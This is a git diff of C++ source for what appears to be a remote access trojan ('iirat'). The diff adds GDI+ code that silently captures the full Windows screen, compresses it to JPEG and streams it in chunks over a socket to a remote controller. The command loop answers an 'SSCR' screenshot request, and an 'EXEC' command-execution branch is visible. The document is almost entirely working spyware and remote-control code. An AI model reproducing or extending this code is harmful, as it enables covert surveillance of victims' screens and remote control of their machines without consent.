@@ -2,7 +2,7 @@
 * @Author: amaneureka
 * @Date:   2017-04-02 03:33:49
 * @Last Modified by:   amaneureka
-* @Last Modified time: 2017-04-05 23:55:01
+* @Last Modified time: 2017-04-06 12:14:41
 */
 
 #include <vector>
@@ -17,7 +17,7 @@ using namespace std;
 
 #if __WIN__
 
-    /* g++ -std=gnu++0x -U__STRICT_ANSI__ iirat.cpp -D__WIN__ -lgdi32 */
+    /* g++ -std=gnu++0x -U__STRICT_ANSI__ iirat.cpp -D__WIN__ -lgdi32 -lgdiplus -lole32 */
 
     /* supporting win 7 or later only */
     #define WINVER _WIN32_WINNT_WIN7
@@ -26,6 +26,9 @@ using namespace std;
     #include <windows.h>
     #include <arpa/inet.h>
     #include <sys/socket.h>
+    #include <gdiplus.h>
+
+    using namespace Gdiplus;
 
     /* simple POSIX to windows translation */
     #define sleep Sleep
@@ -199,14 +202,15 @@ const char BASE64_CODE[] = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz
 void convert_and_send(int socket, void *mem, int size)
 {
     int index = 3;
-    char buffer[500] = "RSP";
+    char buffer[2000] = "RSP";
     BYTE* data = (BYTE*)mem;
     for (int i = 0; i < size; i += 3)
     {
-        if (index >= 450)
+        if (index >= 2000)
         {
             write(socket, buffer, index);
             index = 3;
+            sleep(100);
         }
 
         int d = data[i];
@@ -241,52 +245,90 @@ void convert_and_send(int socket, void *mem, int size)
         write(socket, buffer, index);
 }
 
-void GetScreenShot(int socket)
+/* https://msdn.microsoft.com/en-us/library/windows/desktop/ms533843(v=vs.85).aspx */
+int GetEncoderClsid(const WCHAR* format, CLSID* pClsid)
 {
-    BYTE* memory;
-    string str, tmp;
-    BITMAPINFO info;
-    HGDIOBJ old_obj;
-    HBITMAP hBitmap;
-    HDC hScreen, hDC;
-    int width, height, bytes;
-    BITMAPINFOHEADER infoHeader;
+    UINT num = 0;
+    UINT size = 0;
 
-    /* get screen dimensions */
+    ImageCodecInfo* pImageCodecInfo = NULL;
+
+    GetImageEncodersSize(&num, &size);
+    if (size == 0) return -1;
+
+    pImageCodecInfo = (ImageCodecInfo*)(malloc(size));
+    if (pImageCodecInfo == NULL) return -1;
+
+    GetImageEncoders(num, size, pImageCodecInfo);
+
+    for(UINT j = 0; j < num; ++j)
+    {
+        if (wcscmp(pImageCodecInfo[j].MimeType, format) == 0)
+        {
+            *pClsid = pImageCodecInfo[j].Clsid;
+            free(pImageCodecInfo);
+            return j;
+        }
+    }
+
+    free(pImageCodecInfo);
+    return -1;
+}
+
+void get_screenshot(int socket)
+{
+    CLSID clsid;
+    ULONG quality;
+    int width, height;
+    HDC screenDC, memDC;
+    HBITMAP memBit, oldbit;
+    ULONG_PTR gdiplusToken;
+    EncoderParameters encoderParameters;
+    GdiplusStartupInput gdiplusStartupInput;
+
+    GdiplusStartup(&gdiplusToken, &gdiplusStartupInput, NULL);
+
     width = GetSystemMetrics(SM_CXVIRTUALSCREEN);
     height = GetSystemMetrics(SM_CYVIRTUALSCREEN);
 
-    /* info header */
-    infoHeader.biSize          = sizeof(infoHeader);
-    infoHeader.biWidth         = width;
-    infoHeader.biHeight        = height;
-    infoHeader.biPlanes        = 1;
-    infoHeader.biBitCount      = 24;
-    infoHeader.biCompression   = BI_RGB;
-    infoHeader.biSizeImage     = 0;
-    infoHeader.biXPelsPerMeter = 0;
-    infoHeader.biYPelsPerMeter = 0;
-    infoHeader.biClrUsed       = 0;
-    infoHeader.biClrImportant  = 0;
+    screenDC = GetDC(NULL);
+    memDC = CreateCompatibleDC(screenDC);
+    memBit = CreateCompatibleBitmap(screenDC, width, height);
 
-    info.bmiHeader = infoHeader;
+    oldbit = (HBITMAP)SelectObject(memDC, memBit);
+    BitBlt(memDC, 0, 0, width, height, screenDC, 0, 0, SRCCOPY);
 
-    /* copy screen to bitmap */
-    hScreen = GetDC(NULL);
-    hDC     = CreateCompatibleDC(hScreen);
-    //hBitmap = CreateCompatibleBitmap(hScreen, width, height);
-    hBitmap = CreateDIBSection(hScreen, &info, DIB_RGB_COLORS, (void**)&memory, 0, 0);
-    old_obj = SelectObject(hDC, hBitmap);
-    BitBlt(hDC, 0, 0, width, height, hScreen, 0, 0, SRCCOPY);
+    Bitmap bitmap(memBit, NULL);
+    GetEncoderClsid(L"image/jpeg", &clsid);
 
-    bytes = (((24*width + 31) & (~31))/8)*height;
-    convert_and_send(socket, memory, size);
+    quality = 20;
+    encoderParameters.Count = 1;
+    encoderParameters.Parameter[0].Guid = EncoderQuality;
+    encoderParameters.Parameter[0].Type = EncoderParameterValueTypeLong;
+    encoderParameters.Parameter[0].NumberOfValues = 1;
+    encoderParameters.Parameter[0].Value = &quality;
 
-    /* clean up */
-    SelectObject(hDC, old_obj);
-    DeleteDC(hDC);
-    ReleaseDC(NULL, hScreen);
-    DeleteObject(hBitmap);
+    IStream *pStream = NULL;
+    CreateStreamOnHGlobal(NULL, TRUE, &pStream);
+    bitmap.Save(pStream, &clsid, &encoderParameters);
+
+    STATSTG stg = {};
+    ULARGE_INTEGER pos = {};
+    LARGE_INTEGER liZero = {};
+
+    pStream->Seek(liZero, STREAM_SEEK_SET, &pos);
+    pStream->Stat(&stg, STATFLAG_NONAME);
+
+    ULONG bytesRead = 0;
+    char buffer[1024] = "RSP";
+    int size2read = stg.cbSize.LowPart;
+
+    for (int i = 0; i < size2read; i += 1000)
+    {
+        pStream->Read(buffer + 3, 1000, &bytesRead);
+        write(socket, buffer, bytesRead + 3);
+        sleep(10);
+    }
 }
 
 int main(int argc, char *argv[])
@@ -406,7 +448,7 @@ int main(int argc, char *argv[])
 
                         if (req == "SSCR")
                             /* get screenshot */
-                            GetScreenShot(sock);
+                            get_screenshot(sock);
 
                         else if (req == "EXEC")
                             /* command to execute */
